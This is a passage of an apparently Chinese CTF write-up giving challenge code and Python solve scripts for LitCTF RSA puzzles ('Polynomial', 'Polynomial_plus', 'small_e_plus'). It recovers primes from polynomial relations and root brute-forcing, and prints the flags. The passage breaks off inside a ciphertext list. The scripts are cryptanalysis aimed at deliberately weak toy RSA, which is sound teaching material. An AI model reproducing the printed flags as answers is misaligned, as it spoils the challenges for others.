Polynomial1 = 58154360680755769340954893572401748667033313354117942223258370092578635555451803701875246040822675770820625484823955325325376503299610647282074512182673844099014723538935840345806279326671621834884174315042653272845859393720044076731894387316020043030549656441366838837625687203481896972821231596403741150142
Polynomial2 = 171692903673150731426296312524549271861303258108708311216496913475394189393793697817800098242049692305164782587880637516028827647505093628717337292578359337044168928317124830023051015272429945829345733688929892412065424786481363731277240073380880692592385413767327833405744609781605297684139130460468105300760
Polynomial3 = 97986346322515909710602796387982657630408165005623501811821116195049269186902123564611531712164389221482586560334051304898550068155631792198375385506099765648724724155022839470830188199666501947166597094066238209936082936786792764398576045555400742489416583987159603174056183635543796238419852007348207068832
c = 690029769225186609779381701643778761457138553080920444396078012690121613426213828722870549564971078807093600149349998980667982840018011505754141625901220546541212773327617562979660059608220851878701195162259632365509731746682263484332327620436394912873346114451271145412882158989824703847237437871480757404551113620810392782422053869083938928788602100916785471462523020232714027448069442708638323048761035121752395570167604059421559260760645061567883338223699900
'''</span></code></pre>
<p>主要就是解那个三元二次方程组，当时没解出来，可能脚本写错了</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sympy
Polynomial1<span class="token operator">=</span><span class="token number">58154360680755769340954893572401748667033313354117942223258370092578635555451803701875246040822675770820625484823955325325376503299610647282074512182673844099014723538935840345806279326671621834884174315042653272845859393720044076731894387316020043030549656441366838837625687203481896972821231596403741150142</span>
Polynomial2<span class="token operator">=</span><span class="token number">171692903673150731426296312524549271861303258108708311216496913475394189393793697817800098242049692305164782587880637516028827647505093628717337292578359337044168928317124830023051015272429945829345733688929892412065424786481363731277240073380880692592385413767327833405744609781605297684139130460468105300760</span>
Polynomial3<span class="token operator">=</span><span class="token number">97986346322515909710602796387982657630408165005623501811821116195049269186902123564611531712164389221482586560334051304898550068155631792198375385506099765648724724155022839470830188199666501947166597094066238209936082936786792764398576045555400742489416583987159603174056183635543796238419852007348207068832</span>
p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">"q"</span><span class="token punctuation">)</span>
r <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Symbol<span class="token punctuation">(</span><span class="token string">"r"</span><span class="token punctuation">)</span>
f1 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Eq<span class="token punctuation">(</span>p<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span>q<span class="token punctuation">,</span> Polynomial1<span class="token punctuation">)</span>
f2 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Eq<span class="token punctuation">(</span>q<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span>r<span class="token punctuation">,</span> Polynomial2<span class="token punctuation">)</span>
f3 <span class="token operator">=</span> sympy<span class="token punctuation">.</span>Eq<span class="token punctuation">(</span>r<span class="token operator">**</span><span class="token number">2</span><span class="token operator">+</span>p<span class="token punctuation">,</span> Polynomial3<span class="token punctuation">)</span>
res <span class="token operator">=</span> sympy<span class="token punctuation">.</span>solve<span class="token punctuation">(</span><span class="token punctuation">(</span>f1<span class="token punctuation">,</span> f2<span class="token punctuation">,</span> f3<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">#p=7625900647186256736313352208336189136024613525845451962194744676052072325262646533642163553090015734584960267587813894745414843037111074258730819958397631</span>
<span class="token comment">#q=13103163880267648221851617296336865295731278851373488569182099549824826973560296247802058712197255433671825570972129891122274435889696663320490806634737981</span>
<span class="token comment">#r=9898805297737495640281149403465681435952383402115255751446422784763742395898034378399391604085137196351802539935697155137226495010184322468562791581344399</span></code></pre>
<p>然后直接解就行了</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
p<span class="token operator">=</span><span class="token number">7625900647186256736313352208336189136024613525845451962194744676052072325262646533642163553090015734584960267587813894745414843037111074258730819958397631</span>
q<span class="token operator">=</span><span class="token number">13103163880267648221851617296336865295731278851373488569182099549824826973560296247802058712197255433671825570972129891122274435889696663320490806634737981</span>
r<span class="token operator">=</span><span class="token number">9898805297737495640281149403465681435952383402115255751446422784763742395898034378399391604085137196351802539935697155137226495010184322468562791581344399</span>
c<span class="token operator">=</span><span class="token number">690029769225186609779381701643778761457138553080920444396078012690121613426213828722870549564971078807093600149349998980667982840018011505754141625901220546541212773327617562979660059608220851878701195162259632365509731746682263484332327620436394912873346114451271145412882158989824703847237437871480757404551113620810392782422053869083938928788602100916785471462523020232714027448069442708638323048761035121752395570167604059421559260760645061567883338223699900</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q <span class="token operator">*</span> r
e <span class="token operator">=</span> <span class="token number">65537</span>
phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>r<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#LitCTF&#123;P0lynomi4l_i5_inter3st1ng&#125;</span></code></pre>
<h3 id="Polynomial-plus"><a href="#Polynomial-plus" class="headerlink" title="Polynomial_plus"></a>Polynomial_plus</h3><pre class="language-bash" data-language="bash"><code class="language-bash">from Crypto.Util.number <span class="token function">import</span> *
from secret <span class="token function">import</span> flag

m <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token keyword">while</span> True:
    k <span class="token operator">=</span> getRandomNBitInteger<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> k**10 + <span class="token number">22</span>*k**8 + <span class="token number">53</span>*k**6 - <span class="token number">22</span>*k**4 - <span class="token number">39</span>*k**2 + <span class="token number">114514</span>
    q <span class="token operator">=</span> k**9 + <span class="token number">10</span>*k**7 - <span class="token number">13</span>*k**6 - <span class="token number">2</span>*k**4 + <span class="token number">111</span>*k**2 + <span class="token number">1919810</span>
    <span class="token keyword">if</span> isPrime<span class="token punctuation">(</span>p<span class="token punctuation">)</span> and isPrime<span class="token punctuation">(</span>q<span class="token punctuation">)</span>:
        e <span class="token operator">=</span> <span class="token number">65537</span>
        n <span class="token operator">=</span> p * q
        c <span class="token operator">=</span> pow<span class="token punctuation">(</span>m,e,n<span class="token punctuation">)</span>
        print<span class="token punctuation">(</span>f<span class="token string">"n = &#123;n&#125;"</span><span class="token punctuation">)</span>
        print<span class="token punctuation">(</span>f<span class="token string">"c = &#123;c&#125;"</span><span class="token punctuation">)</span>
        <span class="token builtin class-name">break</span>

<span class="token string">''</span>'
n <span class="token operator">=</span> <span class="token number">343424787688946710828788193478518340184635630498236346907606509763011890082198311173501834898393322176325060349656021994088578448585570427399686920253145504431065451412326430233084073651599248661762036671841142048573051549474182586297565046285161375600990596119448538118327240405957845178956427810835797220204485242640945891970398041508724313442375608608662117158013</span>
c <span class="token operator">=</span> <span class="token number">300097152084696274516003269451037367405899874736667089358316145472977115856239312841307278390995620995063953407731245808077915106161525019835875978698148238617148929170257141762407514139479267867121064342168993486529889088067645866930029787500052390195406519896658384623575160091828173111087120708969655686251340535134778177193882787257773427670338018428731395437974</span>
<span class="token string">''</span>'</code></pre>
<p>p和q由k生成，分析可以知道n约为k的19次方，对n开19次方，然后小范围爆破得到p和q</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> gmpy2
n <span class="token operator">=</span> <span class="token number">343424787688946710828788193478518340184635630498236346907606509763011890082198311173501834898393322176325060349656021994088578448585570427399686920253145504431065451412326430233084073651599248661762036671841142048573051549474182586297565046285161375600990596119448538118327240405957845178956427810835797220204485242640945891970398041508724313442375608608662117158013</span>
c <span class="token operator">=</span> <span class="token number">300097152084696274516003269451037367405899874736667089358316145472977115856239312841307278390995620995063953407731245808077915106161525019835875978698148238617148929170257141762407514139479267867121064342168993486529889088067645866930029787500052390195406519896658384623575160091828173111087120708969655686251340535134778177193882787257773427670338018428731395437974</span>

t <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>iroot<span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2000</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    k<span class="token operator">=</span>t<span class="token operator">+</span>i
    p <span class="token operator">=</span> k<span class="token operator">**</span><span class="token number">10</span> <span class="token operator">+</span> <span class="token number">22</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">8</span> <span class="token operator">+</span> <span class="token number">53</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">22</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token number">39</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">114514</span>
    q <span class="token operator">=</span> k<span class="token operator">**</span><span class="token number">9</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">7</span> <span class="token operator">-</span> <span class="token number">13</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">6</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">4</span> <span class="token operator">+</span> <span class="token number">111</span><span class="token operator">*</span>k<span class="token operator">**</span><span class="token number">2</span> <span class="token operator">+</span> <span class="token number">1919810</span>
    <span class="token keyword">if</span> p<span class="token operator">*</span>q<span class="token operator">==</span>n<span class="token punctuation">:</span>
        phi<span class="token operator">=</span><span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        d<span class="token operator">=</span>gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
        m<span class="token operator">=</span><span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
<span class="token comment">#LitCTF&#123;Th1s_i5_a_trick_for_s0lving_polynomi4l&#125;</span></code></pre>
<h3 id="small-e-plus"><a href="#small-e-plus" class="headerlink" title="small_e_plus"></a>small_e_plus</h3><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">import</span> random
<span class="token keyword">from</span> secret <span class="token keyword">import</span> flag

e <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span>
p <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
q <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
n <span class="token operator">=</span> p <span class="token operator">*</span> q
c_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> m <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
    c_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"n = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>n<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"c_list = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>c_list<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
n <span class="token operator">=</span> <span class="token number">26287684934288536371438030224508784042871268975402791015134838900290249602701092702492594931306572692868654436714501196060619149020850402317982203575250568283872182497606239389480186694649979877566740647822434500023605871516831662099415987589808614777313595453727243531121031390104059097782466650186291076316486240197369759537327997880644540629964227584070506981319936888159712058406052247256554081989035415864476278146328967410452695134756792942103209740186339835071828587981271027235499355298543650516643100665039796305276163706693873611519506528344413021878980171629732211592839945004800782325172828561339662590291</span>
c_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2206795524649235905421691489826312664535869158473992241382107452229902627430789178221234450699214518235612692491501082306158268745610575202210170312762929300421312081998256557805289595256913161318967687803957784191522197708618872099119883772100567610799038030170491575261415069363292331223848994909959222662307903914818692008641789258455591462146141825906954662346647872459477376830019604449386735009274664469596162731339288162705222622464022019805917855614180415135305122287341306358535204977475464107550060171378721195970927993762052901722822033817371589592984818877687488499315074761849162622037910992107211284008</span><span class="token punctuation">,</span> <span class="token number">5772355660578786193365289788142204471140300880779240030922539554921206850801450259027942229717816557629121843824901435845363716561820657469786680232585256790197665053482436914240306106895783671092825614792775018452789907242936725194811142759000550943111242261233418906869936542409260521957109457093880078265172230140113023756025958760162033801341277275818552619176398362323345440943751030254826411167403369778520042425875280132329006784704419423985932863729258308660619215866531848636409929423223281439774682034891288220844217705947244646337813999934326056219959633197870528867256797102445018262011480153115939973120</span><span class="token punctuation">,</span> <span class="token number">1207753724090260852409848530096938494041869666191344850580616117902540004602216282128000198616910613629758228599152405146528856830526069167686468063404160733191610918533887137790198044549066176847699828584104335658872479915611835658770230456040566481519133420435691429577114944632254145293686212844875236028065213764327990843553209848826790721557229795796629116716323389485143635207391322758673224679570474982769025868784848121296090448593104527159728316178638031965733210974157123951201010132807247490252051791615388655934783546925682929869630639426022317978556708362738999927581494799492081969707506643799602026519</span><span class="token punctuation">,</span> <span class="token number">23349127335265499093449067069020992112353295858939476460071138364566485897994252926437380788575729410533824920877221793075557803246884503318707565286465780619451837755333889863647223503631040527885884507188543322662521167319750343131600891690509665461069767205371629056201897374077580748284228605137071513643680112231720015635177198512671008206911131037246521082139072649111758853436401697265407050360284081221903913252963538698624243925508340434415847360772868692706825954252596535393923195017520961377182762938864807222401006410940590209478399415565644283710492027537832649211992078485373823473694670510027091811150</span><span class="token punctuation">,</span> <span class="token number">10226019140134038624377317848115153109426202728030240919051914421470768415604166541259309040981729429302658204608838639560323294519400489855382683083386777345356043308705897287912341523315760693349431629528606884165134456829229982105748229536220053836967234793460400007088552230829556977946642054006994624346182400713981635617380105674142096166299590924644975504927529440869894823989816288037184537810548374154159131078285611810236360387224739364737369218239938401877019353452254541733135847328578198473654682547864026753170978019586975399474768379227943763421295905943744276512487256848753432567851910082922927470490</span><span class="token punctuation">,</span> <span class="token number">23740354509167079065405461731971916754037420716194453557110579966491604804762436810357240604414289616234875179623546843181969909941655688193848922121025497722570206788206574369953117810580405098086613804927789389379000011120646581696237263731340862157598831413772589626428552355215317461446703978266643741459189148155110184955643416482312525932611502239696070143649593393180531208682271982848368078201739398938285094875058820959849311021066738043111703290623367049523633339597166603017770974672021851132978175318897057265294143015585933755643775222343716729295329665381969705644856166297065958733244549838186512052385</span><span class="token punctuation">,</span> <span class="token number">449014525939717636067736015209424784219819246781576119976763479723069921555975991244061404426209241205491628463587064147168107292515973015167075933513053376730612977909688147192509972914228546673914859512456020534607548288441547681099206879988569397951304088877152364775649300942230940480095891405872756559515878791481146087187792174110744462062133353030045674834570611547897985227875674282106272664164460098105513231986703990634100117091825872525928884988567006942035220750862383326774903397508340077320163638705664083267751275414767422570459999305221215356075828860083175263731374754412655619766335149006888723996</span><span class="token punctuation">,</span> <span class="token number">16724794744491727600425925395927244417134995504796613762545001848691858676855371900138882794396073589851705829977971925497098298081053830365847044742295241579270222074264270766160828536659842604404241318349399345391073018854800119637771843569778469196738774691245194283589151708822054754891860887285845079956055960799325451486703248118285066709862851457478898785928241590593187351807366412037409877885725182051826065860998104380663508501993855389845296242673609538795480745163836240239734138130049347272635936034792561725248889899428632572191869130319297765786132841511245497565771732921602763273993266122615935214603</span><span class="token punctuation">,</span> <span class="token number">8335009241673468873253675068463589266426701056401774737990647304778993560605655347351631416630769577522424783603153098182609522990968188535194397812386924076809847791156568504352196579970447867606517135531565802449373639411293098029825159629692422202058452950834073234658264013415977347155192720165418683784735863643368164054960138519912292186928345518922656777075501616408802833213759105274620228201695472893761054437789976692657170111413189445894590722931833376629118468092175170858255694444972297979072766528207056455924414294930988285253186403605383727454401973318032223978796412991222953728595468797201373820622</span><span class="token punctuation">,</span> <span class="token number">1717028738196915227260339129573501065417757436024070728399837662683474643676720266190852688571851260086024584528234004503770202991702828738603236485267929860326697228640681326889845794391744206929580676537615769150484083242039924741303807364343064097449659558370778499818290907827480001580408520014110979083082316647497828342236619136282585160822630608240519352654269080203964531142386474415714079196749108940162898716817139452352062000261548631825989143362746715121123292436275957550673873937398160148303975715603319819731258894296533494152025775404106195174909015831441339509280028585399046169513149752204461930349</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token number">1207753724090260852409848530096938494041869666191344850580616117902540004602216282128000198616910613629758228599152405146528856830526069167686468063404160733191610918533887137790198044549066176847699828584104335658872479915611835658770230456040566481519133420435691429577114944632254145293686212844875236028065213764327990843553209848826790721557229795796629116716323389485143635207391322758673224679570474982769025868784848121296090448593104527159728316178638031965733210974157123951201010132807247490252051791615388655934783546925682929869630639426022317978556708362738999927581494799492081969707506643799602026519</span><span class="token punctuation">,</span> <span class="token number">5772355660578786193365289788142204471140300880779240030922539554921206850801450259027942229717816557629121843824901435845363716561820657469786680232585256790197665053482436914240306106895783671092825614792775018452789907242936725194811142759000550943111242261233418906869936542409260521957109457093880078265172230140113023756025958760162033801341277275818552619176398362323345440943751030254826411167403369778520042425875280132329006784704419423985932863729258308660619215866531848636409929423223281439774682034891288220844217705947244646337813999934326056219959633197870528867256797102445018262011480153115939973120</span><span class="token punctuation">,</span> <span class="token number">1717028738196915227260339129573501065417757436024070728399837662683474643676720266190852688571851260086024584528234004503770202991702828738603236485267929860326697228640681326889845794391744206929580676537615769150484083242039924741303807364343064097449659558370778499818290907827480001580408520014110979083082316647497828342236619136282585160822630608240519352654269080203964531142386474415714079196749108940162898716817139452352062000261548631825989143362746715121123292436275957550673873937398160148303975715603319819731258894296533494152025775404106195174909015831441339509280028585399046169513149752204461930349</span><span class="token punctuation">,</span> <span class="token number">16954257214609715453949449319699339161494232855569310228933510507504171504126469206091874371244790265592761015613256403517471291015511338346765442554575984841436537843152588028133877350821930031082920487532579036233128796943768462075658517963544351576867080570835108123172127678561307490005618742426940555485915573421790050723171701483141269800431262504278004147886695150170337842904413809555649193394856219267444671017423976317095448634183238063104910602376968654113825856753568856181455666796555652402905808458114516561773417952991326953537750434218624122318995368477991659040481704212571743288062208854477599259233</span><span class="token punctuation">,</span> <span class="token number">16724794744491727600425925395927244417134995504796613762545001848691858676855371900138882794396073589851705829977971925497098298081053830365847044742295241579270222074264270766160828536659842604404241318349399345391073018854800119637771843569778469196738774691245194283589151708822054754891860887285845079956055960799325451486703248118285066709862851457478898785928241590593187351807366412037409877885725182051826065860998104380663508501993855389845296242673609538795480745163836240239734138130049347272635936034792561725248889899428632572191869130319297765786132841511245497565771732921602763273993266122615935214603</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">1748234508408435343229319253644625402817707176509451594647354284826288727338735967235360246609210161049023834307132290872525340273117113455850690260255921823613621383639409134488848519959372177408937889998552431530493839856756914185531673290249084408278489645057787655359507244021027375565961471003583528932265312366403288884176948556324167675395562225956088863571715251876674710333918813480215719798596428736037441464450389735436535142133977551778467378533427938402690627170065561491269748888688911598444983102702261665208037447965537895418969759387684448834920453303484908559802952752182953165141625674023904414158</span><span class="token punctuation">,</span> <span class="token number">11012890581084315425095922547777050020962029248110211263311188736825161568336991045243917700829742195694068118244042803336244383422040087972310576680130493039066637029837297205028290343840934744140990838248421706520572790950203052596858612764294640351774272157943334862976359969574219205290501939867352064476895317015572786888474774760071718201404856802312145427767679849647981118814029138127523521157700904020659839293447586228220702194369342121785362851205183676546931393764208787501487430625010774845511515509394872334800320955439381971987176625826068199951062429360895302585774691509075464492623725384467268825285</span><span class="token punctuation">,</span> <span class="token number">5976772453334984518311442738240004799220403662435440872185530863193424233037367952925902243175234771035939695813307154967530503941081645934538688267920825967077726208002575899575371222695901346361307413004351281869655229087644917183767240951265807406293078230174759543645470570834782744332808979716142354429389228605592485271438778026468985249730030159932637979600514791593524263931036554765213297195922837236962842381131840868115187459577702023810124989825582700575011520568245435377833934768593346195065831458857440454704013911127816011037625063876159283174160162690848395114549568308205531592017492613772445173774</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">6452875340997852295275020218749378916760411126851936571996259386760459856313309845592392640856504175949234216794963908475913037761993360407125952607943943083700382006783091443756617877566422165299422992987336811474980284131306966940424642139162441283769172531199959298540627795873212152702317440453079566096174835647147665695679094943137671532124636863128457006714211465119286776747310503452130041649279123753848522079886216732719572247000481047269505214596261386534160935834909921155351371984109147724730932926711831690752003577272018655013647352055561080857579522667684581123594159788011149227192380455462896729962</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token number">20897947836932076779964827384680266669444872541242595584853544810847660781809255811902379402727265984145972717558208216627868351476262475424181241317707734298108218231636329375895362429626917095073694210812814494087830535014117884013936787285440467171742761631884901929078488856204289738449061959822388725333274257861099169377435400465998662612618115681519773625182456433449001773543437767201553703283209697249003117284877232666946456539017194397166088957330100388776645543342462188483091150441369824235427061443229429025534194618806460187812446633057673388068141804189503074739767911838028579099128625845793341901127</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">1207753724090260852409848530096938494041869666191344850580616117902540004602216282128000198616910613629758228599152405146528856830526069167686468063404160733191610918533887137790198044549066176847699828584104335658872479915611835658770230456040566481519133420435691429577114944632254145293686212844875236028065213764327990843553209848826790721557229795796629116716323389485143635207391322758673224679570474982769025868784848121296090448593104527159728316178638031965733210974157123951201010132807247490252051791615388655934783546925682929869630639426022317978556708362738999927581494799492081969707506643799602026519</span><span class="token punctuation">,</span> <span class="token number">8335009241673468873253675068463589266426701056401774737990647304778993560605655347351631416630769577522424783603153098182609522990968188535194397812386924076809847791156568504352196579970447867606517135531565802449373639411293098029825159629692422202058452950834073234658264013415977347155192720165418683784735863643368164054960138519912292186928345518922656777075501616408802833213759105274620228201695472893761054437789976692657170111413189445894590722931833376629118468092175170858255694444972297979072766528207056455924414294930988285253186403605383727454401973318032223978796412991222953728595468797201373820622</span><span class="token punctuation">,</span> <span class="token number">5185490165247175755074805103840625687511977590976733896967715184223982955725681935365096951517529730737911572507779959945930556296503873230438433692310842981978848881986205067999307067785730415524359447947414935770806603135319166013408164683315806218163318125978230966989985398051513033616788512784230934142137906332152151059584574222941527730647262944250765844919176013002939308197949589859844618414360065768222159786067710805154244111569645546199262226746460081578671653615283375596665960708242700241780342523448742861815380568359092813225600016747957517992666799497302478221946509254852979437130583539850985247422</span><span class="token punctuation">,</span> <span class="token number">25920961707523393202281300218444176129734572566815781137488940145677301500180714145402663962373623882683655757546713176923316428191765157386415468883815905581966232659296756935108128028157735278704173240867754374892767863985119564774915890766313799183822643494869775607043330683224121234927784433937849569120283272329925062133702698267726766476110289877776286080853490841837897993369872640809289989540435112046742658888426704252633322563361442888492873827942589957261396606340845665522400646771232316872444568013520651608356878655632725425106340256031308528158877727958784150436116095788759918507442721063497464001672</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token number">25663191423484921175412364224530127146643925340004154726702279647143356157592854508759921404410754752035271117262826349048515204905598320781277358442584209773238813165864338686191131303650343111109522647292342262318312191154828123703005048694144581658454332596649591143235675787721964930836353194643708891591880016775053451232129740204331045326847472524157097116402350309528683224670236144960836423799755065339099128269152330465141709080678776263364496603148723855163217962603724059472220503607467867433663538613289855157923304803789694579660594681244121347757234971567712156039920653800971260669403951884026752686998</span><span class="token punctuation">,</span> <span class="token number">6253489839553538192995294139816446969824750751774728963617638345595670445770677500921617837218605680169746240573789832579137206230177143500699620111070145585461358354523003959756713830108697398762585026303196668650471722612722372863973566811324151291707208671745892059398682725808801715988328719567890446420981480784833951835550433358928430667547317456646990287369723084794020241264506154652275756123282486762023979426752588250225435784747977075518696454125522814567504866613306081720330538332436897331017796420408357014130003339073229042803329670944110125353218213811432346818713964878168764790792105206633440354005</span><span class="token punctuation">,</span> <span class="token 